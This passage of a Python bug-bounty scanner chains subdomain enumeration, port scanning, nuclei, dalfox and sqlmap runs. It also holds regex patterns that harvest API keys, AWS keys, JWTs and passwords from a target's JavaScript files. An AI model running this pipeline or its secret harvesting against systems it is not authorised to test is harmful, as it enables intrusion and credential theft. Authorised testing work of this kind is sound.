# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 9 — VULNERABILITY SCANNING
# ═══════════════════════════════════════════════════════════════════════════

def _nuclei_update_templates(tool: str, logger: logging.Logger) -> None:
    """Update nuclei templates once per day (skip if recently updated)."""
    flag_file = os.path.join(os.path.expanduser("~"), ".nuclei_templates_updated")
    try:
        if os.path.exists(flag_file):
            if time.time() - os.path.getmtime(flag_file) < 86400:
                return
    except Exception:
        pass
    logger.info("  Updating vulnerability database…")
    env = _build_env()
    try:
        # nuclei v3+: use -ut; fallback to old -update-templates for v2
        result = subprocess.run(
            [tool, "-ut"],
            timeout=120, env=env, capture_output=True,
        )
        if result.returncode != 0:
            subprocess.run(
                [tool, "-update-templates"],
                timeout=120, env=env, capture_output=True,
            )
        with open(flag_file, "w"):
            pass
    except Exception:
        pass


def run_nuclei_scan(
    alive_params_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> dict:
    logger.info(colorize("[PHASE 9] Running Nuclei vulnerability scan", Colors.MAGENTA + Colors.BOLD))

    tool = _tool_path("nuclei", config)
    if not tool:
        logger.error("  nuclei not found!")
        return {}

    # Update templates once per day
    _nuclei_update_templates(tool, logger)

    severity    = config.get("nuclei_severity", "low,medium,high,critical")
    concurrency = str(config.get("nuclei_concurrency", 20))
    rate_limit  = str(config.get("nuclei_rate_limit", 20))   # safe default for bug bounty
    timeout_val = str(config.get("timeout", 30))

    findings_json = os.path.join(out_dir, "findings.json")
    findings_txt  = os.path.join(out_dir, "findings.txt")
    findings_csv  = os.path.join(out_dir, "findings.csv")

    # Build target list: UNION of alive_params + alive_hosts (broader coverage)
    alive_params = read_lines(alive_params_file) if alive_params_file else []
    alive_hosts_file = os.path.join(out_dir, "alive_subdomains.txt")
    alive_hosts = extract_urls_from_httpx_output(alive_hosts_file)
    if not alive_hosts:
        alive_hosts = [l for l in read_lines(alive_hosts_file) if l.startswith("http")]

    # Union: scan all alive hosts + param URLs for maximum coverage
    seen: set = set()
    targets: list = []
    for u in (alive_hosts + alive_params):
        if u and u not in seen:
            seen.add(u)
            targets.append(u)

    if not targets:
        logger.warning("  No targets for nuclei — attempting root domain scan")
        domain = config.get("_current_domain", "")
        targets = [f"https://{domain}", f"http://{domain}"] if domain else []

    if not targets:
        logger.error("  No targets available for nuclei scan")
        return {}

    nuclei_targets = os.path.join(out_dir, "nuclei_targets.txt")
    write_lines(nuclei_targets, targets)
    logger.info(f"  Scanning {len(targets)} target(s) (severity: {severity})")

    # High-yield template tags for targeted bug bounty scanning
    high_yield_tags = (
        "cves,exposed-panels,misconfigs,takeovers,default-logins,"
        "exposures,file-inclusion,injection,ssrf,xss,sqli,rce,lfi,"
        "open-redirect,xxe,ssti,cors,jwt,graphql"
    )

    env = _build_env()

    proxy_flags = (["-proxy", config["proxy"]] if config.get("proxy") else [])

    def _run_nuclei(extra_flags: list, label: str) -> None:
        cmd = [
            tool,
            "-l", nuclei_targets,
            "-severity", severity,
            "-c", concurrency,
            "-rate-limit", rate_limit,
            "-jsonl",
            "-o", findings_json,
            "-no-color",
            "-timeout", timeout_val,
            "-retries", "2",
        ] + proxy_flags + extra_flags
        logger.info(f"  Vulnerability engine — {label}…")
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=2400, env=env)
            if proc.returncode != 0 and proc.stderr:
                for line in proc.stderr.splitlines()[:5]:
                    if line.strip() and "level" not in line.lower():
                        logger.debug(f"  [engine] {line.strip()[:120]}")
        except subprocess.TimeoutExpired:
            logger.warning(f"  Vulnerability scan ({label}) timed out — partial results saved")
        except Exception as exc:
            logger.error(f"  Vulnerability scan error: {exc}")

    # Pass 1: automatic tech-detection scan (discovers tech stack, runs matching templates)
    _run_nuclei(["-as"], "tech detection")

    # Pass 2: high-yield tag-based scan (runs independently of tech detection)
    _run_nuclei(["-tags", high_yield_tags], "targeted templates")

    # Generate human-readable TXT from JSONL (no second scan)
    findings = parse_nuclei_json(findings_json)
    if findings:
        try:
            with open(findings_txt, "w", encoding="utf-8") as f:
                for fi in findings:
                    info = fi.get("info", {})
                    sev = info.get("severity", "unknown").upper()
                    name = info.get("name", fi.get("template-id", ""))
                    url = fi.get("matched-at", "")
                    f.write(f"[{sev}] {name} — {url}\n")
        except Exception:
            pass

    export_findings_csv(findings, findings_csv)

    summary = summarize_findings(findings)
    logger.info(colorize("  Vulnerability engine scan complete!", Colors.GREEN))
    logger.info(f"  Critical : {colorize(str(summary.get('critical', 0)), Colors.RED + Colors.BOLD)}")
    logger.info(f"  High     : {colorize(str(summary.get('high', 0)), Colors.RED)}")
    logger.info(f"  Medium   : {colorize(str(summary.get('medium', 0)), Colors.YELLOW)}")
    logger.info(f"  Low      : {colorize(str(summary.get('low', 0)), Colors.BLUE)}")
    logger.info(f"  Info     : {colorize(str(summary.get('info', 0)), Colors.GRAY)}")

    return summary


def parse_nuclei_json(json_file: str) -> List[dict]:
    findings: List[dict] = []
    if not os.path.exists(json_file):
        return findings
    with open(json_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
                findings.append(obj)
            except json.JSONDecodeError:
                continue
    return findings


def export_findings_csv(findings: List[dict], csv_file: str) -> None:
    if not findings:
        return
    fieldnames = ["template-id", "name", "severity", "matched-at", "type", "description"]
    ensure_dir(os.path.dirname(csv_file))
    with open(csv_file, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="ignore")
        writer.writeheader()
        for finding in findings:
            info = finding.get("info", {})
            row = {
                "template-id":  finding.get("template-id", ""),
                "name":         info.get("name", ""),
                "severity":     info.get("severity", ""),
                "matched-at":   finding.get("matched-at", ""),
                "type":         finding.get("type", ""),
                "description":  info.get("description", ""),
            }
            writer.writerow(row)


def summarize_findings(findings: List[dict]) -> dict:
    summary: dict = {}
    for finding in findings:
        sev = finding.get("info", {}).get("severity", "unknown").lower()
        summary[sev] = summary.get(sev, 0) + 1
    return summary


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 10 — RESULT STORAGE & REPORTING
# ═══════════════════════════════════════════════════════════════════════════

def save_scan_report(
    domain: str,
    out_dir: str,
    summary: dict,
    config: dict,
    logger: logging.Logger,
    start_time: float,
) -> None:
    duration = time.time() - start_time
    report = {
        "domain": domain,
        "scan_date": datetime.utcnow().isoformat() + "Z",
        "duration_seconds": round(duration, 2),
        "files": {
            "subdomains":      "subdomains.txt",
            "alive_subdomains": "alive_subdomains.txt",
            "all_urls":        "all_urls.txt",
            "filtered_urls":   "filtered_urls.txt",
            "params":          "params.txt",
            "alive_params":    "alive_params.txt",
            "findings_json":   "findings.json",
            "findings_txt":    "findings.txt",
            "findings_csv":    "findings.csv",
        },
        "counts": {
            name: count_lines(os.path.join(out_dir, fname))
            for name, fname in {
                "subdomains":    "subdomains.txt",
                "alive_hosts":   "alive_subdomains.txt",
                "all_urls":      "all_urls.txt",
                "filtered_urls": "filtered_urls.txt",
                "params":        "params.txt",
                "alive_params":  "alive_params.txt",
            }.items()
        },
        "vulnerability_summary": summary,
    }

    report_file = os.path.join(out_dir, "scan_report.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)

    mins, secs = divmod(int(duration), 60)
    logger.info(colorize(f"\n{'═' * 60}", Colors.CYAN))
    logger.info(colorize(f"  SCAN REPORT — {domain}", Colors.BOLD + Colors.WHITE))
    logger.info(colorize(f"{'═' * 60}", Colors.CYAN))
    logger.info(f"  Duration   : {mins}m {secs}s")
    logger.info(f"  Output dir : {colorize(out_dir, Colors.CYAN)}")
    for k, v in report["counts"].items():
        logger.info(f"  {k:<15}: {colorize(str(v), Colors.GREEN)}")
    if summary:
        logger.info(colorize("  ── Vulnerabilities ──", Colors.YELLOW))
        for sev in ["critical", "high", "medium", "low", "info"]:
            val = summary.get(sev, 0)
            if val:
                col = Colors.RED if sev in ("critical", "high") else Colors.YELLOW if sev == "medium" else Colors.BLUE
                logger.info(f"  {sev:<12}: {colorize(str(val), col)}")
    logger.info(colorize(f"{'═' * 60}\n", Colors.CYAN))


# ═══════════════════════════════════════════════════════════════════════════
#  TELEGRAM NOTIFICATIONS
# ═══════════════════════════════════════════════════════════════════════════

def send_telegram(message: str, config: dict, logger: logging.Logger) -> None:
    tg = config.get("telegram", {})
    if not tg.get("enabled") or not REQUESTS_AVAILABLE:
        return
    token   = tg.get("bot_token", "")
    chat_id = tg.get("chat_id", "")
    if not token or not chat_id:
        return
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        requests.post(url, json={"chat_id": chat_id, "text": message}, timeout=10)
        logger.debug("  Telegram notification sent")
    except Exception as e:
        logger.warning(f"  Telegram error: {e}")


# ═══════════════════════════════════════════════════════════════════════════
#  RESUME SUPPORT
# ═══════════════════════════════════════════════════════════════════════════

RESUME_FILE = ".scan_state.json"


def load_resume_state(out_dir: str) -> dict:
    path = os.path.join(out_dir, RESUME_FILE)
    try:
        with open(path) as f:
            return json.load(f)
    except Exception:
        return {}


def save_resume_state(out_dir: str, state: dict) -> None:
    path = os.path.join(out_dir, RESUME_FILE)
    ensure_dir(out_dir)
    with open(path, "w") as f:
        json.dump(state, f, indent=2)


def phase_done(state: dict, phase: str) -> bool:
    return state.get(phase, False)


def mark_phase_done(state: dict, out_dir: str, phase: str) -> None:
    state[phase] = True
    save_resume_state(out_dir, state)


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN SCAN PIPELINE
# ═══════════════════════════════════════════════════════════════════════════

def scan_domain(domain: str, args: argparse.Namespace, config: dict, logger: logging.Logger) -> dict:
    start_time = time.time()
    out_dir = os.path.join(config["output_base"], domain)
    ensure_dir(out_dir)

    state = load_resume_state(out_dir) if args.resume else {}

    subdomains_file     = os.path.join(out_dir, "subdomains.txt")
    alive_file          = os.path.join(out_dir, "alive_subdomains.txt")
    all_urls_file       = os.path.join(out_dir, "all_urls.txt")
    filtered_file       = os.path.join(out_dir, "filtered_urls.txt")
    params_file         = os.path.join(out_dir, "params.txt")
    alive_params_file   = os.path.join(out_dir, "alive_params.txt")
    js_urls_file        = os.path.join(out_dir, "js_files.txt")

    banner = colorize(f"\n{'▶' * 3} Scanning: {domain} {'◀' * 3}", Colors.BOLD + Colors.CYAN)
    logger.info(banner)
    send_telegram(f"[BugBounty Scanner] Starting scan: {domain}", config, logger)

    # ── Phase 2: Subdomain Enumeration ──────────────────────────────────────
    if not phase_done(state, "subdomains") or not os.path.exists(subdomains_file):
        enumerate_subdomains(domain, out_dir, config, logger, skip_subfinder=args.skip_subfinder)
        mark_phase_done(state, out_dir, "subdomains")
    else:
        logger.info(colorize("[PHASE 2] Subdomains — RESUMED (skipping)", Colors.GRAY))

    if _shutdown_event.is_set():
        return {}

    # ── Phase 3: Live Host Detection ─────────────────────────────────────────
    if not phase_done(state, "alive") or not os.path.exists(alive_file):
        run_httpx(subdomains_file, alive_file, config, logger)
        mark_phase_done(state, out_dir, "alive")
    else:
        logger.info(colorize("[PHASE 3] Alive hosts — RESUMED (skipping)", Colors.GRAY))

    if _shutdown_event.is_set():
        return {}

    # ── Phase 3b: Port Scan (nmap) ───────────────────────────────────────────
    open_ports_file = os.path.join(out_dir, "open_ports.txt")
    if not phase_done(state, "port_scan"):
        run_nmap_port_scan(alive_file, out_dir, config, logger)
        mark_phase_done(state, out_dir, "port_scan")
    else:
        logger.info(colorize("[PHASE 3b] Port scan — RESUMED (skipping)", Colors.GRAY))

    if _shutdown_event.is_set():
        return {}

    if args.crawl_only:
        logger.info(colorize("--crawl-only flag set; stopping after URL collection", Colors.YELLOW))

    # ── Phase 4: URL Collection ──────────────────────────────────────────────
    if not phase_done(state, "urls") or not os.path.exists(all_urls_file):
        collect_urls(domain, alive_file, out_dir, config, logger)
        mark_phase_done(state, out_dir, "urls")
    else:
        logger.info(colorize("[PHASE 4] URL collection — RESUMED (skipping)", Colors.GRAY))

    if _shutdown_event.is_set() or args.crawl_only:
        return {}

    # ── Phase 5: Directory Discovery ─────────────────────────────────────────
    if not phase_done(state, "dirsearch"):
        run_dirsearch(alive_file, all_urls_file, out_dir, config, logger)
        mark_phase_done(state, out_dir, "dirsearch")
    else:
        logger.info(colorize("[PHASE 5] Dirsearch — RESUMED (skipping)", Colors.GRAY))

    if _shutdown_event.is_set():
        return {}

    # ── Phase 5b: JS File Collection ────────────────────────────────────────
    if not phase_done(state, "js_collect") or not os.path.exists(js_urls_file):
        collect_js_files(all_urls_file, out_dir, logger)
        mark_phase_done(state, out_dir, "js_collect")

    # ── Phase 6: JS Secret Analysis ─────────────────────────────────────────
    if not phase_done(state, "js_secrets") and os.path.exists(js_urls_file):
        analyze_js_secrets(js_urls_file, out_dir, config, logger)
        mark_phase_done(state, out_dir, "js_secrets")
    else:
        logger.info(colorize("[PHASE JS] JS analysis — SKIPPED", Colors.GRAY))

    if _shutdown_event.is_set():
        return {}

    # ── Phase 7: URL Filtering ───────────────────────────────────────────────
    if not phase_done(state, "filter") or not os.path.exists(filtered_file):
        filter_urls(domain, all_urls_file, out_dir, config, logger)
        mark_phase_done(state, out_dir, "filter")
    else:
        logger.info(colorize("[PHASE 7] URL filtering — RESUMED (skipping)", Colors.GRAY))

    # ── Phase 7b: GF Pattern Classification ─────────────────────────────────
    gf_results: dict = {}
    if not phase_done(state, "gf_patterns") and os.path.exists(filtered_file):
        gf_results = run_gf_patterns(filtered_file, out_dir, logger)
        mark_phase_done(state, out_dir, "gf_patterns")
    else:
        # Re-populate gf_results from existing files for use in vuln scan
        for pname in ["xss", "sqli", "ssrf", "redirect", "lfi", "rce", "idor"]:
            fpath = os.path.join(out_dir, f"gf_{pname}.txt")
            if os.path.exists(fpath):
                gf_results[pname] = fpath

    # ── Phase 8: Parameter Extraction ───────────────────────────────────────
    if not phase_done(state, "params") or not os.path.exists(params_file):
        extract_params(filtered_file, out_dir, logger)
        mark_phase_done(state, out_dir, "params")
    else:
        logger.info(colorize("[PHASE 8] Param extraction — RESUMED (skipping)", Colors.GRAY))

    if _shutdown_event.is_set():
        return {}

    # ── Phase 9: Verify Alive Params ────────────────────────────────────────
    if not phase_done(state, "alive_params") or not os.path.exists(alive_params_file):
        verify_alive_params(params_file, out_dir, config, logger)
        mark_phase_done(state, out_dir, "alive_params")
    else:
        logger.info(colorize("[PHASE 9] Alive param check — RESUMED (skipping)", Colors.GRAY))

    if _shutdown_event.is_set():
        return {}

    # ── Phase 10: Full Vulnerability Scan (Nuclei + dalfox + sqlmap + IDOR) ─
    summary: dict = {}
    if not phase_done(state, "vuln_scan"):
        logger.info(colorize("[PHASE 10] Full vulnerability scanning", Colors.MAGENTA + Colors.BOLD))
        summary = run_full_vuln_scan(
            out_dir, config, logger, gf_results, alive_params_file,
            alive_file=alive_file,
            subdomains_file=subdomains_file,
        )
        mark_phase_done(state, out_dir, "vuln_scan")
    else:
        logger.info(colorize("[PHASE 10] Vuln scan — RESUMED (skipping)", Colors.GRAY))
        # Try to read existing summary
        report_f = os.path.join(out_dir, "scan_report.json")
        if os.path.exists(report_f):
            try:
                with open(report_f) as f:
                    saved = json.load(f)
                summary = saved.get("vulnerability_summary", saved.get("severity_summary", {}))
            except Exception:
                pass

    # ── Phase 11: Generate Report ────────────────────────────────────────────
    save_scan_report(domain, out_dir, summary, config, logger, start_time)
    save_html_report(domain, out_dir, summary, gf_results, logger)

    if summary:
        total_vulns = sum(v for k, v in summary.items() if k not in ("info_secrets",))
        send_telegram(
            f"[BugBounty Scanner] ✅ {domain} scan complete!\n"
            f"Total findings: {total_vulns}\n"
            f"🔴 Critical: {summary.get('critical', 0)}\n"
            f"🟠 High: {summary.get('high', 0)}\n"
            f"🟡 Medium: {summary.get('medium', 0)}\n"
            f"🔑 JS Secrets: {summary.get('info_secrets', 0)}\n"
            f"📁 Output: {out_dir}",
            config, logger,
        )

    mark_phase_done(state, out_dir, "complete")
    return summary


# ═══════════════════════════════════════════════════════════════════════════
#  ARGUMENT PARSER
# ═══════════════════════════════════════════════════════════════════════════

def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="BugBounty AutoScanner — Professional Recon & Vuln Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 scanner.py example.com
  python3 scanner.py -l domains.txt
  python3 scanner.py example.com --threads 50 --rate-limit 100
  python3 scanner.py example.com --skip-subfinder --crawl-only
  python3 scanner.py example.com --resume --verbose
  python3 scanner.py example.com --severity high,critical
        """,
    )

    # Target
    parser.add_argument("domain", nargs="?", help="Single target domain")
    parser.add_argument("-l", "--list", dest="domains_file", help="File containing list of domains")

    # Behavior
    parser.add_argument("--skip-subfinder",  action="store_true",  help="Skip subdomain enumeration")
    parser.add_argument("--crawl-only",       action="store_true",  help="Stop after URL collection phase")
    parser.add_argument("--resume",           action="store_true",  help="Resume previous scan")
    parser.add_argument("--no-dirsearch",     action="store_true",  help="Skip dirsearch phase")
    parser.add_argument("--no-nuclei",        action="store_true",  help="Skip nuclei scanning")
    parser.add_argument("--no-screenshots",   action="store_true",  help="Skip screenshot capture")
    parser.add_argument("--no-xss",           action="store_true",  help="Skip dalfox XSS scan")
    parser.add_argument("--no-sqli",          action="store_true",  help="Skip sqlmap SQLi scan")
    parser.add_argument("--no-js-analysis",   action="store_true",  help="Skip JS secret extraction")

    # Authentication (for authenticated scan)
    parser.add_argument(
        "--auth-cookie",
        default=None,
        help="Session cookie for authenticated scanning (e.g. 'session=abc123; token=xyz')",
    )
    parser.add_argument(
        "--auth-header",
        default=None,
        help="Authorization header value (e.g. 'Bearer eyJ...')",
    )

    # Performance
    parser.add_argument("--threads",      type=int, default=None, help="Thread count (default: 50)")
    parser.add_argument("--rate-limit",   type=int, default=None, help="Requests per second (default: 150)")
    parser.add_argument("--timeout",      type=int, default=None, help="Per-request timeout in seconds")

    # Nuclei
    parser.add_argument(
        "--severity",
        default=None,
        help="Nuclei severity filter (default: low,medium,high,critical)",
    )

    # Output
    parser.add_argument("-o", "--output", default=None, help="Output base directory")
    parser.add_argument("--config",  default=None, help="Path to YAML config file")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose/debug output")
    parser.add_argument("--log",     default=None, help="Write logs to file")

    # Telegram
    parser.add_argument("--telegram-token",   default=None, help="Telegram bot token")
    parser.add_argument("--telegram-chat-id", default=None, help="Telegram chat ID")

    return parser


def apply_args_to_config(args: argparse.Namespace, config: dict) -> None:
    if args.threads:
        config["threads"] = args.threads
    if args.rate_limit:
        config["rate_limit"] = args.rate_limit
    if args.timeout:
        config["timeout"] = args.timeout
    if args.severity:
        config["nuclei_severity"] = args.severity
    if args.output:
        config["output_base"] = args.output
    if args.telegram_token:
        config["telegram"]["bot_token"] = args.telegram_token
        config["telegram"]["enabled"] = True
    if args.telegram_chat_id:
        config["telegram"]["chat_id"] = args.telegram_chat_id
    if getattr(args, "auth_cookie", None):
        config["auth_cookie"] = args.auth_cookie
    if getattr(args, "auth_header", None):
        config["auth_header"] = args.auth_header
    # Feature flags from args
    config["no_xss"]         = getattr(args, "no_xss", False)
    config["no_sqli"]        = getattr(args, "no_sqli", False)
    config["no_js_analysis"] = getattr(args, "no_js_analysis", False)


# ═══════════════════════════════════════════════════════════════════════════
#  BANNER
# ═══════════════════════════════════════════════════════════════════════════

BANNER = r"""
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║    ██████╗ ██╗   ██╗ ██████╗ ██████╗  ██████╗ ██╗   ██╗███╗   ██╗      ║
║    ██╔══██╗██║   ██║██╔════╝ ██╔══██╗██╔═══██╗██║   ██║████╗  ██║      ║
║    ██████╔╝██║   ██║██║  ███╗██████╔╝██║   ██║██║   ██║██╔██╗ ██║      ║
║    ██╔══██╗██║   ██║██║   ██║██╔══██╗██║   ██║██║   ██║██║╚██╗██║      ║
║    ██████╔╝╚██████╔╝╚██████╔╝██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║      ║
║    ╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝      ║
║                                                                          ║
║         AutoScanner v2.0 — Bug Bounty Recon & Vuln Framework            ║
║                     Designed for Kali Linux                              ║
╚══════════════════════════════════════════════════════════════════════════╝
"""


# ═══════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════

def main() -> None:
    parser = build_arg_parser()
    args = parser.parse_args()

    # Validate targets
    if not args.domain and not args.domains_file:
        parser.error("Provide a domain or -l <domains_file>")

    config = load_config(args.config)
    apply_args_to_config(args, config)

    logger = setup_logging(log_file=args.log, verbose=args.verbose)

    print(colorize(BANNER, Colors.CYAN))

    if not check_dependencies(config, logger):
        logger.error(colorize("Required tools missing. Install them and retry.", Colors.RED))
        sys.exit(1)

    targets = load_targets(
        [args.domain] if args.domain else [],
        args.domains_file,
    )

    if not targets:
        logger.error("No valid targets found.")
        sys.exit(1)

    logger.info(f"Loaded {colorize(str(len(targets)), Colors.GREEN)} target(s)")
    logger.info(f"Output directory: {colorize(config['output_base'], Colors.CYAN)}")

    global_summary: dict = {}

    if len(targets) == 1:
        global_summary[targets[0]] = scan_domain(targets[0], args, config, logger)
    else:
        max_parallel = min(3, len(targets))
        logger.info(f"Scanning {len(targets)} targets with {max_parallel} parallel workers")
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_parallel) as exe:
            fut_map = {exe.submit(scan_domain, t, args, config, logger): t for t in targets}
            for fut in concurrent.futures.as_completed(fut_map):
                t = fut_map[fut]
                try:
                    global_summary[t] = fut.result()
                except Exception as e:
                    logger.error(f"Error scanning {t}: {e}")
                    global_summary[t] = {}

    # Global summary report
    summary_file = os.path.join(config["output_base"], "global_summary.json")
    ensure_dir(config["output_base"])
    with open(summary_file, "w") as f:
        json.dump(global_summary, f, indent=2)

    logger.info(colorize(f"Global summary saved: {summary_file}", Colors.GREEN))

    if _shutdown_event.is_set():
        logger.warning(colorize("Scan interrupted by user.", Colors.YELLOW))
    else:
        logger.info(colorize("All scans completed successfully.", Colors.GREEN + Colors.BOLD))


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 3b — SCREENSHOTS
# ═══════════════════════════════════════════════════════════════════════════

def run_gowitness(alive_file: str, out_dir: str, config: dict, logger: logging.Logger) -> str:
    """Capture screenshots of all alive hosts using gowitness."""
    tool = _tool_path("gowitness", config)
    if not tool:
        logger.warning("  gowitness not found — install: go install github.com/sensepost/gowitness@latest")
        return ""

    screenshots_dir = os.path.join(out_dir, "screenshots")
    ensure_dir(screenshots_dir)
    db_file = os.path.join(screenshots_dir, "gowitness.sqlite3")

    alive_urls = extract_urls_from_httpx_output(alive_file)
    if not alive_urls:
        alive_urls = [l for l in read_lines(alive_file) if l.startswith("http")]
    if not alive_urls:
        logger.warning("  No alive hosts to screenshot")
        return screenshots_dir

    logger.info(f"  Capturing screenshots of {len(alive_urls)} hosts")
    run_command(
        [
            tool, "scan", "file",
            "-f", alive_file,
            "--screenshot-path", screenshots_dir,
            "--db-location", db_file,
            "--threads", "5",
            "--timeout", "15",
            "--disable-logging",
        ],
        timeout=300, logger=logger,
    )
    shots = [f for f in os.listdir(screenshots_dir) if f.endswith(".png")]
    logger.info(f"  Screenshots captured: {colorize(str(len(shots)), Colors.GREEN)}")
    return screenshots_dir


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 5b — JS FILE COLLECTION & SECRET ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════

# Regex patterns to detect secrets in JS files
_JS_SECRET_PATTERNS: List[tuple] = [
    (re.compile(r'(?i)(?:api[_-]?key|apikey)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,64})["\']'),  "API Key"),
    (re.compile(r'(?i)(?:secret[_-]?key|client[_-]?secret)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,64})["\']'), "Secret Key"),
    (re.compile(r'(?i)(?:password|passwd|pwd)\s*[:=]\s*["\']([^"\']{8,64})["\']'),           "Password"),
    (re.compile(r'(?i)(?:access[_-]?token|auth[_-]?token|bearer)\s*[:=\s]+["\']([a-zA-Z0-9_\-\.]{30,})["\']'), "Access Token"),
    (re.compile(r'AKIA[0-9A-Z]{16}'),                                                          "AWS Access Key ID"),
    (re.compile(r'(?i)aws[_-]?secret[_-]?access[_-]?key\s*[:=]\s*["\']([a-zA-Z0-9+/]{40})["\']'), "AWS Secret Key"),
    (re.compile(r'(?i)(?:mongodb|mysql|postgresql|redis|amqp)://[^\s"\'<>]{10,}'),            "Database URL"),
    (re.compile(r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}'),          "JWT Token"),
    (re.compile(r'AIza[0-9A-Za-z\-_]{35}'),                                                   "Google API Key"),
    (re.compile(r'(?i)(?:private[_-]?key|rsa[_-]?key)\s*[:=]\s*["\']([^"\']{20,})["\']'),   "Private Key"),
    (re.compile(r'gh[pousr]_[A-Za-z0-9_]{36,255}'),                                           "GitHub Token"),
    (re.compile(r'xox[baprs]-[0-9A-Za-z\-]{10,}'),                                            "Slack Token"),
    (re.compile(r'(?i)(?:authorization|x-api-key)\s*[:=]\s*["\']([a-zA-Z0-9_\-\.]{20,})["\']'), "Auth Header Value"),
    (re.compile(r'(?i)(?:smtp|mail[_-]?password)\s*[:=]\s*["\']([^"\']{6,64})["\']'),        "SMTP Credential"),
    (re.compile(r'(?i)(?:internal|staging|dev|test)\.[a-z0-9\-]+\.[a-z]{2,}'),               "Internal Domain"),
    (re.compile(r'/api/v\d+/(?:admin|internal|debug|config|secret)[^\s"\'<>]*'),              "Sensitive API Path"),
]


def collect_js_files(all_urls_file: str, out_dir: str, logger: logging.Logger) -> str:
    """Extract JS file URLs from collected URLs list."""
    all_urls = read_lines(all_urls_file)
    js_urls  = [u for u in all_urls if re.search(r'\.js(\?|$)', u, re.I) and u.startswith("http")]
    js_file  = os.path.join(out_dir, "js_files.txt")
    count = write_lines(js_file, js_urls)
    logger.info(f"  JS files found: {colorize(str(count), Colors.GREEN)}")
    return js_file


def analyze_js_secrets(
    js_urls_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> str:
    """Download JS files and extract secrets using regex. Returns secrets.json path."""
    logger.info(colorize("[PHASE JS] Analyzing JavaScript files for secrets", Colors.MAGENTA + Colors.BOLD))

    if not REQUESTS_AVAILABLE:
        logger.warning("  requests library not available — skipping JS analysis")
        return ""

    js_urls  = read_lines(js_urls_file)
    if not js_urls:
        logger.info("  No JS files to analyze")
        return ""

    secrets: List[dict] = []
    headers  = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    auth_cookie = config.get("auth_cookie", "")
    if auth_cookie:
        headers["Cookie"] = auth_cookie

    timeout  = min(int(config.get("timeout", 15)), 15)
    max_js   = min(len(js_urls), 200)  # Limit to prevent excessive scanning
    logger.info(f"  Analyzing {max_js} JS files...")

    import concurrent.futures as _cf

    def _scan_js(url: str) -> List[dict]:
        found = []
        try:
            resp = requests.get(url, headers=headers, timeout=timeout, verify=False)
            if resp.status_code != 200 or "javascript" not in resp.headers.get("content-type", ""):
                return found
            content = resp.text[:500_000]  # Max 500KB per file
            for pattern, label in _JS_SECRET_PATTERNS:
                for match in pattern.finditer(content):
                    secret_val = match.group(1) if match.lastindex and match.lastindex >= 1 else match.group(0)
                    # Skip obvious placeholders
                    if any(p in secret_val.lower() for p in ["example", "placeholder", "your_", "insert_", "xxxxxxx", "test123"]):
                        continue
                    found.append({
                        "type":   label,
                        "value":  secret_val[:120],
                        "url":    url,
                        "line":   content[:content.find(match.group(0))].count("\n") + 1,
                    })
        except Exception:
            pass
        return found

    with _cf.ThreadPoolExecutor(max_workers=10) as exe:
        futs = {exe.submit(_scan_js, url): url for url in js_urls[:max_js]}
        for fut in _cf.as_completed(futs):
            try:
                results = fut.result()
                secrets.extend(results)
            except Exception:
                pass

    secrets_file = os.path.join(out_dir, "js_secrets.json")
    with open(secrets_file, "w") as f:
        json.dump(secrets, f, indent=2)

    # Also write human-readable version
    secrets_txt = os.path.join(out_dir, "js_secrets.txt")
    with open(secrets_txt, "w") as f:
        for s in secrets:
            f.write(f"[{s['type']}] {s['url']}\n  → {s['value']}\n\n")

    by_type: dict = {}
    for s in secrets:
        by_type[s["type"]] = by_type.get(s["type"], 0) + 1

    logger.info(f"  Secrets found: {colorize(str(len(secrets)), Colors.RED if secrets else Colors.GREEN)}")
    for t, c in sorted(by_type.items(), key=lambda x: -x[1]):
        logger.info(f"    {t}: {c}")

    return secrets_file


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 8b — GF PATTERN CLASSIFICATION
# ═══════════════════════════════════════════════════════════════════════════

# Built-in GF-style patterns for parameter-based vuln classification
_GF_PATTERNS = {
    "xss": re.compile(
        r'[?&](?:q|s|search|query|keyword|term|text|name|title|content|input|'
        r'message|comment|data|value|output|html|body|head|script|src|href|'
        r'redirect|url|link|ref|callback|jsonp|next|return|goto|target|page)=',
        re.I
    ),
    "sqli": re.compile(
        r'[?&](?:id|cat|item|page|num|p|order|sort|dir|column|row|table|db|'
        r'select|from|where|group|limit|offset|filter|start|end|year|month|day|'
        r'user|uid|userid|user_id|account|category|subcategory|article|post|news|'
        r'product|pid|cid|aid|oid|tid|nid|vid|fid|did|gid|mid|bid|sid|rid)=',
        re.I
    ),
    "ssrf": re.compile(
        r'[?&](?:url|uri|path|dest|destination|redirect|proxy|request|load|fetch|'
        r'host|resource|target|image|source|file|doc|document|page|feed|callback|'
        r'api|endpoint|server|addr|address|website|link|href|location|to|from|'
        r'origin|refer|referer|referrer|domain)=',
        re.I
    ),
    "redirect": re.compile(
